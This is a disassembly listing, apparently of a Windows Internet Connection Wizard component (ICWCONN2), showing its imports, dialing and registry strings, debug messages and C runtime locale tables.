		extrn __imp__ExitWindowsEx@8:dword
					; CODE XREF: CallDownLoad(ushort *,HINSTANCE__ *)+2E7p
					; DATA XREF: CallDownLoad(ushort *,HINSTANCE__ *)+2E7r
; BOOL __stdcall SetDlgItemTextW(HWND hDlg, int	nIDDlgItem, LPCWSTR lpString)
		extrn __imp__SetDlgItemTextW@12:dword
					; CODE XREF: DialErrDlgProc(x,x,x,x)+DDp
					; DialErrDlgProc(x,x,x,x)+127p	...
; BOOL __stdcall EndDialog(HWND	hDlg, INT_PTR nResult)
		extrn __imp__EndDialog@8:dword ; CODE XREF: DialErrDlgProc(x,x,x,x)+6F5p
					; DialErrDlgProc(x,x,x,x)+71Ep	...
; BOOL __stdcall PostMessageW(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
		extrn __imp__PostMessageW@16:dword
					; CODE XREF: HelpKybdHookProc(int,uint,long)+3Ep
					; DATA XREF: HelpKybdHookProc(int,uint,long)+3Er
; HWND __stdcall GetDlgItem(HWND hDlg, int nIDDlgItem)
		extrn __imp__GetDlgItem@8:dword	; CODE XREF: ProcessDBCS(HWND__	*,int)+30p
					; DialErrDlgProc(x,x,x,x)+F0p ...
; int __stdcall	MessageBoxW(HWND hWnd, LPCWSTR lpText, LPCWSTR lpCaption, UINT uType)
		extrn __imp__MessageBoxW@16:dword
					; CODE XREF: ShowDialingDialog(ushort *,tagGATHEREDINFO	*,ushort *,HINSTANCE__ *,HWND__	*,ushort *)+45p
					; DialErrDlgProc(x,x,x,x):loc_100461Fp	...
; int _wsprintfW(LPWSTR, LPCWSTR, ...)
		extrn __imp__wsprintfW:dword
					; CODE XREF: DialErrGetDisplayableNumber(void)+183p
					; DialErrGetDisplayableNumber(void)+1A3p ...
; int __stdcall	LoadStringW(HINSTANCE hInstance, UINT uID, LPWSTR lpBuffer, int	cchBufferMax)
		extrn __imp__LoadStringW@16:dword
					; CODE XREF: StatusMessageCallback(ulong,ushort	*,ulong)+53p
					; GetSz(ushort)+40p
					; DATA XREF: ...
; BOOL __stdcall EnableWindow(HWND hWnd, BOOL bEnable)
		extrn __imp__EnableWindow@8:dword ; CODE XREF: DialErrDlgProc(x,x,x,x)+1A6p
					; DialErrDlgProc(x,x,x,x)+20Fp	...
		extrn _USER32_NULL_THUNK_DATA:byte:4

; ===========================================================================

; Segment type:	Pure code
; Segment permissions: Read/Execute
_text		segment	para public 'CODE' use32
		assume cs:_text
		;org 1001200h
		assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
		dd 0
		dd 41107B3Ah, 0
		dd 2, 25h, 2 dup(3898h), 330023h, 370032h, 300037h, 0
; char ProcName[]
ProcName	db 'DialingDownloadDialog',0
					; DATA XREF: ShowDialingDialog(ushort *,tagGATHEREDINFO	*,ushort *,HINSTANCE__ *,HWND__	*,ushort *):loc_10039BEo
		align 4
; const	WCHAR LibFileName
LibFileName:				; DATA XREF: ShowDialingDialog(ushort *,tagGATHEREDINFO	*,ushort *,HINSTANCE__ *,HWND__	*,ushort *)+C0o
		unicode	0, <icwdial.dll>,0
; const	WCHAR aLuS
aLuS:					; DATA XREF: DialErrGetDisplayableNumber(void)+19Do
		unicode	0, <+%lu %s>,0
		align 10h
; const	WCHAR aLuSS
aLuSS:					; DATA XREF: DialErrGetDisplayableNumber(void)+17Do
		unicode	0, <+%lu (%s) %s>,0
		align 4
; const	WCHAR Default
Default		dw 0			; DATA XREF: DoneDlgProc(x,x,x,x)+6Ao
					; DoneRebootDlgProc(x,x,x,x)+68o ...
		align 10h
; char aRassetentrypro[]
aRassetentrypro	db 'RasSetEntryPropertiesScriptPatch',0
					; DATA XREF: LclSetEntryScriptPatch(ushort *,ushort *)+1Ao
		align 4
; const	WCHAR aIcwdial_dll
aIcwdial_dll:				; DATA XREF: LclSetEntryScriptPatch(ushort *,ushort *)+7o
		unicode	0, <ICWDIAL.DLL>,0
; const	WCHAR aIsdn
aIsdn:					; DATA XREF: FillModems(void)+188o
		unicode	0, <ISDN>,0
		align 4
; const	WCHAR String1
String1:				; DATA XREF: FillModems(void)+165o
		unicode	0, <MODEM>,0
; const	WCHAR szHelp
szHelp:					; DATA XREF: DialErrDlgProc(x,x,x,x)+1C2o
					; DialErrDlgProc(x,x,x,x)+704o
		unicode	0, <connect.hlp>
		dw 3Eh
		unicode	0, <proc4>,0
; const	WCHAR aRasapi32_dll_0
aRasapi32_dll_0:			; DATA XREF: RNAAPI::RNAAPI(void)+Bo
		unicode	0, <RASAPI32.DLL>,0
		align 4
; const	WCHAR aRnaph_dll
aRnaph_dll:				; DATA XREF: RNAAPI::RNAAPI(void)+21o
		unicode	0, <RNAPH.DLL>,0
aRasvalidateent	db 'RasValidateEntryName',0
		align 10h
aRassetautodial	db 'RasSetAutodialEnable',0
		align 4
; char aRasenumdevices[]
aRasenumdevices	db 'RasEnumDevicesW',0  ; DATA XREF: RNAAPI::RasEnumDevicesW(tagRASDEVINFOW *,ulong *,ulong *)+Bo
aRasvalidatee_0	db 'RasValidateEntryNameW',0
		align 10h
; char aRassetentryp_0[]
aRassetentryp_0	db 'RasSetEntryPropertiesW',0
					; DATA XREF: RNAAPI::RasSetEntryPropertiesW(ushort *,ushort *,uchar *,ulong,uchar *,ulong)+39o
		align 4
; char aRasgetentrypro[]
aRasgetentrypro	db 'RasGetEntryPropertiesW',0
					; DATA XREF: RNAAPI::RasGetEntryPropertiesW(ushort *,ushort *,uchar *,ulong *,uchar *,ulong *)+5Eo
		align 10h
; char aRasdeleteentry[]
aRasdeleteentry	db 'RasDeleteEntryW',0  ; DATA XREF: RNAAPI::RasDeleteEntryW(ushort *,ushort *)+Bo
aRashangupw	db 'RasHangUpW',0
		align 4
aRasgetconnects	db 'RasGetConnectStatusW',0
		align 4
aRasdialw	db 'RasDialW',0
		align 10h
aRasenumconnect	db 'RasEnumConnectionsW',0
aRasgetentrydia	db 'RasGetEntryDialParamsW',0
		align 4
; char aRasgetcountryi[]
aRasgetcountryi	db 'RasGetCountryInfoW',0
					; DATA XREF: RNAAPI::RasGetCountryInfoW(RASCTRYINFO *,ulong *)+Bo
		align 10h
aRassetentrydia	db 'RasSetEntryDialParamsW',0
		align 4
aRassetautodi_0	db 'RasSetAutodialAddressW',0
		align 10h
; unsigned __int16 aIcwconn2Rasget
aIcwconn2Rasget:			; DATA XREF: RNAAPI::RasGetEntryPropertiesW(ushort *,ushort *,uchar *,ulong *,uchar *,ulong *)+88o
		unicode	0, <ICWCONN2: RasGetEntryProperties returned %lu>
		dw 0Dh,	0Ah, 0
		align 10h
; const	WCHAR aBranding
aBranding:				; DATA XREF: DeleteFileKindaLikeThisOne(ushort *)+48o
		unicode	0, <Branding>,0
		align 4
; const	WCHAR aServerless
aServerless:				; DATA XREF: DeleteFileKindaLikeThisOne(ushort *)+43o
		unicode	0, <Serverless>,0
		align 4
; unsigned __int16 aFile
aFile:					; DATA XREF: IsURL(ushort *)+5Bo
		unicode	0, <FILE:>,0
; unsigned __int16 aGopher
aGopher:				; DATA XREF: IsURL(ushort *)+47o
		unicode	0, <GOPHER:>,0
; unsigned __int16 aFtp
aFtp:					; DATA XREF: IsURL(ushort *)+33o
		unicode	0, <FTP:>,0
		align 4
; unsigned __int16 aHttps
aHttps:					; DATA XREF: IsURL(ushort *)+1Fo
		unicode	0, <HTTPS:>,0
		align 4
; unsigned __int16 aHttp
aHttp:					; DATA XREF: IsURL(ushort *)+Bo
		unicode	0, <HTTP:>,0
; unsigned __int16 aIcwconn2Findfi
aIcwconn2Findfi:			; DATA XREF: FindFirstWhiteSpace(ushort	*):loc_1005131o
		unicode	0, <ICWCONN2: FindFirstWhiteSpace discovered unmatched quote.>
		dw 0Ah,	0
		align 4
; unsigned __int16 aConnect2Loadst
aConnect2Loadst:			; DATA XREF: GetSz(ushort)+4Bo
		unicode	0, <CONNECT2:LoadString	failed %d>
		dw 0Ah,	0
		align 4
; const	WCHAR AppName
AppName:				; DATA XREF: DoneDlgProc(x,x,x,x)+74o
					; DoneRebootDlgProc(x,x,x,x)+72o ...
		unicode	0, <ClientSetup>,0
; const	WCHAR KeyName
KeyName:				; DATA XREF: DoneDlgProc(x,x,x,x)+6Fo
					; DoneRebootDlgProc(x,x,x,x)+6Do
		unicode	0, <Done_Message>,0
		align 4
; wchar_t aIns
aIns:					; DATA XREF: ParseCommandLine(ushort *)+4Ao
		unicode	0, </INS:>,0
; wchar_t String
String:					; DATA XREF: ParseCommandLine(ushort *)+26o
		unicode	0, </CONNECTOID:>,0
		align 4
; wchar_t SubStr
SubStr:					; DATA XREF: ParseCommandLine(ushort *)+10o
		unicode	0, </REBOOT>,0
; const	WCHAR a_ins_0
a_ins_0:				; DATA XREF: DeleteFileKindaLikeThisOne(ushort *)+E0o
		unicode	0, <*.INS>,0
; const	WCHAR String2
String2:				; DATA XREF: DeleteFileKindaLikeThisOne(ushort *)+97o
		unicode	0, <.INS>,0
		align 10h
; unsigned __int16 aIcwconn2Callcm
aIcwconn2Callcm:			; DATA XREF: CallCMConfig(ushort const *,ushort	*)+B6o
		unicode	0, <ICWCONN2: CallCMConfig exiting with	error code %d >
		dw 0Ah,	0
; unsigned __int16 aIcwconn2Unable
aIcwconn2Unable:			; DATA XREF: CallCMConfig(ushort const *,ushort	*):loc_10059FAo
		unicode	0, <ICWCONN2: Unable to	call the Configure entry point>
		dw 0Ah,	0
; unsigned __int16 aIcwconn2Call_1
aIcwconn2Call_1:			; DATA XREF: CallCMConfig(ushort const *,ushort	*)+7Co
		unicode	0, <ICWCONN2: Calling the %d entry point>
		dw 0Ah,	0
		align 10h
; unsigned __int16 aIcwconn2Callin
aIcwconn2Callin:			; DATA XREF: CallCMConfig(ushort const *,ushort	*)+5Bo
		unicode	0, <ICWCONN2: Calling GetProcAddress on	%s>
		dw 0Ah,	0
; unsigned __int16 aIcwconn2Call_0
aIcwconn2Call_0:			; DATA XREF: CallCMConfig(ushort const *,ushort	*)+3Ao
		unicode	0, <ICWCONN2: Calling LoadLibrary on %s>
		dw 0Ah,	0
		align 4
a_cmconfig@8	db '_CMConfig@8',0      ; DATA XREF: CallCMConfig(ushort const *,ushort *)+22o
		dd 0
aCmcfg32_dll:				; DATA XREF: CallCMConfig(ushort const *,ushort	*)+13o
		unicode	0, <CMCFG32.DLL>,0
		align 8
; unsigned __int16 aIcwconn2Coul_1
aIcwconn2Coul_1:			; DATA XREF: My32ShellExecute(ushort *)+EFo
		unicode	0, <ICWCONN2: Couldn>
		dw 27h
		unicode	0, <t execute the command >
		dw 27h
		unicode	0, <%s %s>
		dw 27h,	0Ah, 0
; const	WCHAR SrcStr
SrcStr		dw 0			; DATA XREF: My32ShellExecute(ushort *)+E8o
					; ___crtLCMapStringA+1Co ...
		align 4
; const	WCHAR Operation
Operation:				; DATA XREF: My32ShellExecute(ushort *):loc_1005B0Eo
		unicode	0, <open>,0
		align 4
aIcwconn2GotIeP:			; DATA XREF: My32ShellExecute(ushort *):loc_1005AD1o
		unicode	0, <ICWCONN2: got IE Path of %s>
		dw 0Ah,	0
		align 8
; unsigned __int16 aIcwconn2Couldn
aIcwconn2Couldn:			; DATA XREF: My32ShellExecute(ushort *)+73o
		unicode	0, <ICWCONN2: Couldn>
		dw 27h
		unicode	0, <t find IE appPath, using generic %s>,0
		align 4
aIexplore_exe:				; DATA XREF: My32ShellExecute(ushort *):loc_1005AA8o
		unicode	0, <IEXPLORE.EXE>,0
		align 10h
; const	WCHAR SubKey
SubKey:					; DATA XREF: My32ShellExecute(ushort *)+18o
					; My32ShellExecute(ushort *)+55o
		unicode	0, <Software\Microsoft\Windows\CurrentVersion\App Paths\IEXPL>
		unicode	0, <ORE.EXE>,0
		align 4
; const	WCHAR aExplore_comman
aExplore_comman:			; DATA XREF: CallDownLoad(ushort *,HINSTANCE__ *)+322o
		unicode	0, <Explore_Command>,0
		align 8
; unsigned __int16 aIcwconn2Cmcfg3
aIcwconn2Cmcfg3:			; DATA XREF: CallDownLoad(ushort *,HINSTANCE__ *):loc_1005E13o
		unicode	0, <ICWCONN2: CMCFG32 DLL not found, I guess CM	ain>
		dw 27h
		unicode	0, <t installed.>
		dw 0Ah,	0
; const	WCHAR aIsp_support_me
aIsp_support_me:			; DATA XREF: CallDownLoad(ushort *,HINSTANCE__ *)+1A0o
		unicode	0, <ISP_Support_Message>,0
; const	WCHAR ValueName
ValueName:				; DATA XREF: CallDownLoad(ushort *,HINSTANCE__ *)+150o
					; WinMain(x,x,x,x)+243o
		unicode	0, <UserInfo>,0
		align 10h
; const	WCHAR aSoftwareMicros
aSoftwareMicros:			; DATA XREF: CallDownLoad(ushort *,HINSTANCE__ *)+101o
					; DeleteIRN(void)+4Fo ...
		unicode	0, <SOFTWARE\MICROSOFT\ISIGNUP>,0
		align 4
; unsigned __int16 aConnect2Client
aConnect2Client:			; DATA XREF: CallDownLoad(ushort *,HINSTANCE__ *)+DFo
		unicode	0, <CONNECT2: Client setup URL in .ins file is empty.>
		dw 0Ah,	0
		align 10h
; unsigned __int16 aConnect2CallBa
aConnect2CallBa:			; DATA XREF: CallDownLoad(ushort *,HINSTANCE__ *)+C9o
		unicode	0, <CONNECT2: call back	using the >
		dw 27h
		unicode	0, <%s>
		dw 27h
		unicode	0, < connectoid.>
		dw 0Ah,	0
; char aInetgetautodia[]
aInetgetautodia	db 'InetGetAutodial',0  ; DATA XREF: CallDownLoad(ushort *,HINSTANCE__ *):loc_1005BE9o
; const	WCHAR aInetcfg_dll
aInetcfg_dll:				; DATA XREF: CallDownLoad(ushort *,HINSTANCE__ *)+62o
		unicode	0, <INETCFG.DLL>,0
; const	WCHAR aRasentryname
aRasentryname:				; DATA XREF: DeleteIRN(void)+A6o
		unicode	0, <RasEntryName>,0
		align 8
; unsigned __int16 aIcwconn2Coul_0
aIcwconn2Coul_0:			; DATA XREF: WinMain(x,x,x,x)+2B5o
		unicode	0, <ICWCONN2: couldn>
		dw 27h
		unicode	0, <t allocate pRnaapi memory in WinMainExit>
		dw 0Ah,	0
		align 10h
; unsigned __int16 aConnect2Quitti
aConnect2Quitti:			; DATA XREF: WinMain(x,x,x,x):loc_100623Fo
		unicode	0, <CONNECT2:Quitting WinMain.>
		dw 0Ah,	0
; const	WCHAR aClient_setup_n
aClient_setup_n:			; DATA XREF: WinMain(x,x,x,x)+196o
		unicode	0, <Client_Setup_New_Call>,0
; const	WCHAR aClient_setup_u
aClient_setup_u:			; DATA XREF: WinMain(x,x,x,x)+183o
		unicode	0, <Client_Setup_Url>,0
		align 4
; const	WCHAR asc_1001D48
asc_1001D48:				; DATA XREF: WinMain(x,x,x,x)+122o
					; WinMain(x,x,x,x)+136o
		unicode	0, <">,0
		align 10h
; unsigned __int16 aIcwconn2Malfor
aIcwconn2Malfor:			; DATA XREF: WinMain(x,x,x,x)+91o
		unicode	0, <ICWCONN2: Malformed	cmd line >
		dw 27h
		unicode	0, <%s>
		dw 27h,	0Ah, 0
		align 4
; const	WCHAR Name
Name:					; DATA XREF: WinMain(x,x,x,x)+49o
		unicode	0, <Internet Connection	Wizard Non ICWCONN1 Component>,0
; char byte_1001DFC[4]
byte_1001DFC	db 4 dup(0)		; DATA XREF: WinMain(x,x,x,x)+Co
					; __wincmdln+19o
stru_1001E00	_SCOPETABLE_ENTRY <0FFFFFFFFh, offset loc_100662E, offset loc_1006642>
					; DATA XREF: _WinMainCRTStartup+2o
					; SEH scope table for function 100648C
		align 10h
aHH:					; DATA XREF: sub_1006C05+1D4o
		unicode	0, <	    h((((		   H>
		dd 7 dup(100010h), 840010h, 4 dup(840084h), 100084h, 3 dup(100010h)
		dd 3 dup(1810181h), 0Ah	dup(1010101h), 3 dup(100010h)
		dd 3 dup(1820182h), 0Ah	dup(1020102h), 2 dup(100010h)
		dd 20h
; char MultiByteStr[]
MultiByteStr	dd 4030201h, 8070605h, 0C0B0A09h, 100F0E0Dh, 14131211h
					; DATA XREF: sub_1006C05+1BCo
		dd 18171615h, 1C1B1A19h, 201F1E1Dh, 24232221h, 28272625h
		dd 2C2B2A29h, 302F2E2Dh, 34333231h, 38373635h, 3C3B3A39h
		dd 403F3E3Dh, 44434241h, 48474645h, 4C4B4A49h, 504F4E4Dh
		dd 54535251h, 58575655h, 5C5B5A59h, 605F5E5Dh, 64636261h
		dd 68676665h, 6C6B6A69h, 706F6E6Dh, 74737271h, 78777675h
		dd 7C7B7A79h, 7F7E7Dh
aLc_time	db 'LC_TIME',0          ; DATA XREF: .data:off_100E214o
aLc_numeric	db 'LC_NUMERIC',0       ; DATA XREF: .data:0100E208o
		align 4
aLc_monetary	db 'LC_MONETARY',0      ; DATA XREF: .data:0100E1FCo
aLc_ctype	db 'LC_CTYPE',0         ; DATA XREF: .data:0100E1F0o
		align 4
aLc_collate	db 'LC_COLLATE',0       ; DATA XREF: .data:off_100E1E4o
		align 4
aLc_all		db 'LC_ALL',0           ; DATA XREF: .data:___lc_categoryo
		align 10h
; char Control[]
Control		db '_.,',0              ; DATA XREF: ___lc_strtolc:loc_10068DDo
a__0		db '.',0                ; DATA XREF: ___lc_lctostr+41o
		align 4
a_		db '_',0                ; DATA XREF: ___lc_lctostr+22o
		align 4
; char asc_1001FDC[]
asc_1001FDC	db ';',0                ; DATA XREF: sub_1006959+6Fo
					; _setlocale+108o
		align 10h
asc_1001FE0	db '=',0                ; DATA XREF: sub_1006959+39o
					; sub_1006959+B3o
		align 4
; char asc_1001FE4[]
asc_1001FE4	db '=;',0               ; DATA XREF: _setlocale:loc_1006F17o
		align 4
; char aCorexitprocess[]
aCorexitprocess	db 'CorExitProcess',0   ; DATA XREF: ___crtExitProcess+14o
		align 4
; char ModuleName[]
ModuleName	db 'mscoree.dll',0      ; DATA XREF: ___crtExitProcess+5o
aRuntimeError	db 'runtime error ',0
		align 4
		db 0Dh,0Ah,0
		align 4
aTlossError	db 'TLOSS error',0Dh,0Ah,0
		align 4
aSingError	db 'SING error',0Dh,0Ah,0
		align 4
aDomainError	db 'DOMAIN error',0Dh,0Ah,0
		align 4
aR6028UnableToI	db 'R6028',0Dh,0Ah
		db '- unable to initialize heap',0Dh,0Ah,0
		align 10h
aR6027NotEnough	db 'R6027',0Dh,0Ah
		db '- not enough space for lowio initialization',0Dh,0Ah,0
		align 4
aR6026NotEnough	db 'R6026',0Dh,0Ah
		db '- not enough space for stdio initialization',0Dh,0Ah,0
		align 10h
aR6025PureVirtu	db 'R6025',0Dh,0Ah
		db '- pure virtual function call',0Dh,0Ah,0
		align 4
aR6024NotEnough	db 'R6024',0Dh,0Ah
		db '- not enough space for _onexit/atexit table',0Dh,0Ah,0
		align 10h
aR6019UnableToO	db 'R6019',0Dh,0Ah
		db '- unable to open console device',0Dh,0Ah,0
		align 4
aR6018Unexpecte	db 'R6018',0Dh,0Ah
		db '- unexpected heap error',0Dh,0Ah,0
		align 10h
aR6017Unexpecte	db 'R6017',0Dh,0Ah
		db '- unexpected multithread lock error',0Dh,0Ah,0
		align 10h
aR6016NotEnough	db 'R6016',0Dh,0Ah
		db '- not enough space for thread data',0Dh,0Ah,0
		align 10h
aThisApplicatio	db 0Dh,0Ah
		db 'This application has requested the Runtime to terminate it in an '
		db 'unusual way.',0Ah
		db 'Please contact the application',27h,'s support team for more informa'
		db 'tion.',0Dh,0Ah,0
		align 4
aR6009NotEnough	db 'R6009',0Dh,0Ah
		db '- not enough space for environment',0Dh,0Ah,0
aR6008NotEnough	db 'R6008',0Dh,0Ah
		db '- not enough space for arguments',0Dh,0Ah,0
		align 10h
aR6002FloatingP	db 'R6002',0Dh,0Ah      ; DATA XREF: .data:off_100E224o
		db '- floating point not loaded',0Dh,0Ah,0
		align 4
aMicrosoftVisua	db 'Microsoft Visual C++ Runtime Library',0 ; DATA XREF: __NMSG_WRITE+191o
		align 10h
asc_1002330	db 0Ah			; DATA XREF: __NMSG_WRITE+15Co
		db 0Ah,0
		align 4
aRuntimeErrorPr	db 'Runtime Error!',0Ah ; DATA XREF: __NMSG_WRITE+11Ao
		db 0Ah
		db 'Program: ',0
		align 10h
; char Source[]
Source		db '...',0              ; DATA XREF: __NMSG_WRITE+D0o
aProgramNameUnk	db '<program name unknown>',0 ; DATA XREF: __NMSG_WRITE+8Bo
		align 10h
stru_1002370	_SCOPETABLE_ENTRY <0FFFFFFFFh, offset loc_10083CF, offset loc_10083D3>
					; DATA XREF: ___crtLCMapStringA+2o
		_SCOPETABLE_ENTRY <0FFFFFFFFh, offset loc_10081C0, offset loc_10081C4> ; SEH scope table for function 10080C9
		_SCOPETABLE_ENTRY <0FFFFFFFFh, offset loc_100828F, offset loc_1008293>
		align 8
; unsigned __int16 _ctype[]
__ctype		db 2 dup(0)
word_100239A	dw 20h			; DATA XREF: ___init_ctype+18Fo
					; sub_1009EFF+1Ar ...
		unicode	0, <	    (((((		   H>
		dd 7 dup(100010h), 840010h, 4 dup(840084h), 100084h, 3 dup(100010h)
		dd 3 dup(810081h), 0Ah dup(10001h), 3 dup(100010h), 3 dup(820082h)
		dd 0Ah dup(20002h), 2 dup(100010h), 20h, 41h dup(0)
; const	unsigned __int16 _wctype[]
__wctype	db 2 dup(0)
word_10025A2	dw 20h			; DATA XREF: .data:__pwctypeo
aHH_0:
		unicode	0, <	    h((((		   H>
		dd 7 dup(100010h), 840010h, 4 dup(840084h), 100084h, 3 dup(100010h)
		dd 3 dup(1810181h), 0Ah	dup(1010101h), 3 dup(100010h)
		dd 3 dup(1820182h), 0Ah	dup(1020102h), 2 dup(100010h)
		dd 10h dup(200020h), 480020h, 8	dup(100010h), 140010h
		dd 100014h, 2 dup(100010h), 100014h, 2 dup(100010h), 1010010h
		dd 0Bh dup(1010101h), 1010010h,	3 dup(1010101h), 0Ch dup(1020102h)
		dd 1020010h, 3 dup(1020102h), 1010102h,	0
; ---------------------------------------------------------------------------

___rgLocInfo:				; DATA XREF: sub_1009340+1Dr
		or	al, [eax+eax]
		add	[eax], dh
		xor	al, 30h
		popa
; ---------------------------------------------------------------------------
		dd 0
off_10027B4	dd offset aSpanishTraditi ; DATA XREF: sub_1009340+88r
					; "Spanish - Traditional Sort"
dword_10027B8	dd 505345h		; DATA XREF: sub_1009340+A7o
		dd offset aSpain	; DATA XREF: sub_1009340+7Dr
					; "Spain"
		dd 505345h		; DATA XREF: sub_1009340+9Do
		dd 303538h, 0		; DATA XREF: sub_1009340+93o
a1252		db '1252',0             ; DATA XREF: sub_1009340+73o
		align 4
		dd 40Bh, 62303430h, 0
		dd offset aFinnish	; "Finnish"
		dd 4E4946h, 1002D90h, 4E4946h, 303538h,	0
a1252_0		db '1252',0
		align 10h
		dd 40Ch, 63303430h, 0
		dd offset aFrench	; "French"
		dd 415246h, 1002D80h, 415246h, 303538h,	0
a1252_1		db '1252',0
		align 4
		dd 40Fh, 66303430h, 0
		dd offset aIcelandic	; "Icelandic"
		dd 4C5349h, 1002D6Ch, 4C5349h, 303538h,	0
a1252_2		db '1252',0
		align 4
		dd 41Dh, 64313430h, 0
		dd offset aSwedish	; "Swedish"
		dd 455653h, 1002D5Ch, 455753h, 303538h,	0
a1252_3		db '1252',0
		align 4
		dd 42Dh, 64323430h, 0
		dd offset aBasque	; "Basque"
		dd 515545h, 1002DA0h, 505345h, 303538h,	0
a1252_4		db '1252',0
		align 10h
		db 0Ah
		db 8,0
		align 4
a080a		db '080a',0
		align 4
		dd offset aSpanish	; "Spanish"
		dd 4D5345h, 1002D44h, 58454Dh, 303538h,	0
a1252_5		db '1252',0
		align 4
		dd 80Ch, 63303830h, 0
		dd offset aFrench	; "French"
		dd 425246h, 1002D3Ch, 4C4542h, 303538h,	0
a1252_6		db '1252',0
		align 4
		dd 0C07h, 37306330h, 0
		dd offset aGerman	; "German"
		dd 414544h, 1002D2Ch, 545541h, 303538h,	0
a1252_7		db '1252',0
		align 4
		dd 0C09h, 39306330h, 0
		dd offset aEnglish	; "English"
		dd 414E45h, 1002D18h, 535541h, 303538h,	0
a1252_8		db '1252',0
		align 10h
		dd 0C0Ah, 61306330h, 0
		dd offset aSpanishModernS ; "Spanish - Modern Sort"
		dd 4E5345h, 1002DA0h, 505345h, 303538h,	0
a1252_9		db '1252',0
		align 4
		dd 0C0Ch, 63306330h, 0
		dd offset aFrench	; "French"
		dd 435246h, 1002CF8h, 4E4143h, 303538h,	0
a1252_10	db '1252',0
		align 4
		dd 100Ah, 61303031h, 0
		dd offset aSpanish	; "Spanish"
		dd 475345h, 1002CECh, 4D5447h, 303538h,	0
a1252_11	db '1252',0
		align 4
		dd 100Ch, 63303031h, 0
		dd offset aFrench	; "French"
		dd 535246h, 1002CE0h, 454843h, 303538h,	0
a1252_12	db '1252',0
		align 10h
		dd 140Ah, 61303431h, 0
		dd offset aSpanish	; "Spanish"
		dd 435345h, 1002CD4h, 495243h, 303538h,	0
a1252_13	db '1252',0
		align 4
		dd 140Ch, 63303431h, 0
		dd offset aFrench	; "French"
		dd 4C5246h, 1002CC8h, 58554Ch, 303538h,	0
a1252_14	db '1252',0
		align 4
		dd 180Ah, 61303831h, 0
		dd offset aSpanish	; "Spanish"
		dd 415345h, 1002CC0h, 4E4150h, 303538h,	0
a1252_15	db '1252',0
		align 4
		dd 1C09h, 39306331h, 0
		dd offset aEnglish	; "English"
		dd 534E45h, 1002CB0h, 46415Ah, 373334h,	0
a1252_16	db '1252',0
		align 10h
		dd 1C0Ah, 61306331h, 0
		dd offset aSpanish	; "Spanish"
		dd 445345h, 1002C9Ch, 4D4F44h, 303538h,	0
a1252_17	db '1252',0
		align 4
		db 0Ah
		db ' ',0
		align 10h
a200a		db '200a',0
		align 4
		dd offset aSpanish	; "Spanish"
		dd 565345h, 1002C90h, 4E4556h, 303538h,	0
a1252_18	db '1252',0
		align 4
		db 0Ah
		db '$',0
		align 4
a240a		db '240a',0
		align 4
		dd offset aSpanish	; "Spanish"
		dd 4F5345h, 1002C84h, 4C4F43h, 303538h,	0
a1252_19	db '1252',0
		align 4
		db 0Ah
		db '(',0
		align 4
a280a		db '280a',0
		align 10h
		dd offset aSpanish	; "Spanish"
		dd 525345h, 1002C7Ch, 524550h, 303538h,	0
a1252_20	db '1252',0
		align 10h
		db 0Ah
		db ',',0
		align 4
a2c0a		db '2c0a',0
		align 4
		dd offset aSpanish	; "Spanish"
		dd 535345h, 1002C70h, 475241h, 303538h,	0
a1252_21	db '1252',0
		align 4
a0		db 0Ah
		db '0',0
		align 10h
a300a		db '300a',0
		align 4
		dd offset aSpanish	; "Spanish"
		dd 465345h, 1002C68h, 554345h, 303538h,	0
a1252_22	db '1252',0
		align 4
a4		db 0Ah
		db '4',0
		align 4
a340a		db '340a',0
		align 4
		dd offset aSpanish	; "Spanish"
		dd 4C5345h, 1002C60h, 4C4843h, 303538h,	0
a1252_23	db '1252',0
		align 4
a8		db 0Ah
		db '8',0
		align 4
a380a		db '380a',0
		align 10h
		dd offset aSpanish	; "Spanish"
		dd 595345h, 1002C58h, 595255h, 303538h,	0
a1252_24	db '1252',0
		align 10h
		db 0Ah
		db '<',0
		align 4
a3c0a		db '3c0a',0
		align 4
		dd offset aSpanish	; "Spanish"
		dd 5A5345h, 1002C4Ch, 595250h, 303538h,	0
a1252_25	db '1252',0
		align 4
aParaguay	db 'Paraguay',0
		align 4
aUruguay	db 'Uruguay',0
aChile		db 'Chile',0
		align 4
aEcuador	db 'Ecuador',0
aArgentina	db 'Argentina',0
		align 4
aPeru		db 'Peru',0
		align 4
aColombia	db 'Colombia',0
		align 10h
aVenezuela	db 'Venezuela',0
		align 4
aDominicanRepub	db 'Dominican Republic',0
		align 10h
aSouthAfrica	db 'South Africa',0
		align 10h
aPanama		db 'Panama',0
		align 4
aLuxembourg	db 'Luxembourg',0
		align 4
aCostaRica	db 'Costa Rica',0
		align 10h
aSwitzerland	db 'Switzerland',0
aGuatemala	db 'Guatemala',0
		align 4
aCanada		db 'Canada',0
		align 10h
aSpanishModernS	db 'Spanish - Modern Sort',0 ; DATA XREF: .text:0100296Co
		align 4
aAustralia	db 'Australia',0
		align 4
aEnglish	db 'English',0          ; DATA XREF: .text:01002940o
					; .text:01002AA0o
aAustria	db 'Austria',0
aGerman		db 'German',0           ; DATA XREF: .text:01002914o
		align 4
aBelgium	db 'Belgium',0
aMexico		db 'Mexico',0
		align 4
aSpanish	db 'Spanish',0          ; DATA XREF: .text:010028BCo
					; .text:010029C4o ...
aBasque		db 'Basque',0           ; DATA XREF: .text:01002890o
		align 4
aSweden		db 'Sweden',0
		align 4
aSwedish	db 'Swedish',0          ; DATA XREF: .text:01002864o
aIceland	db 'Iceland',0
aIcelandic	db 'Icelandic',0        ; DATA XREF: .text:01002838o
		align 10h
aFrance		db 'France',0
		align 4
aFrench		db 'French',0           ; DATA XREF: .text:0100280Co
					; .text:010028E8o ...
		align 10h
aFinland	db 'Finland',0
aFinnish	db 'Finnish',0          ; DATA XREF: .text:010027E0o
aSpain		db 'Spain',0            ; DATA XREF: .text:010027BCo
		align 4
aSpanishTraditi	db 'Spanish - Traditional Sort',0 ; DATA XREF: .text:off_10027B4o
		align 4

___rglangidNotDefault:			; DATA XREF: _TestDefaultCountry+Br
		or	al, 0Ch
		sbb	cl, [edi+eax]
		adc	[esi], dh
		add	al, 0Ch
		or	ds:0C040304h, ch
		adc	[eax], dl
; ---------------------------------------------------------------------------
		db 8, 1Dh, 8
; ---------------------------------------------------------------------------

___rg_country:				; DATA XREF: ___get_qualified_locale+5Co
		jl	short near ptr loc_1002E07+2
		add	[ecx], al
		push	ebp
		push	ebx
		inc	ecx
		add	[edi+ebp+0], dh
		add	[edi+42h], eax
		push	edx
		add	[edi+ebp+0], ch
		add	[ebx+48h], eax
		dec	esi
		add	[edi+ebp+0], ah
		add	[ebx+5Ah], eax
		inc	ebp
		add	[edi+ebp+0], bl
		add	[edi+42h], eax
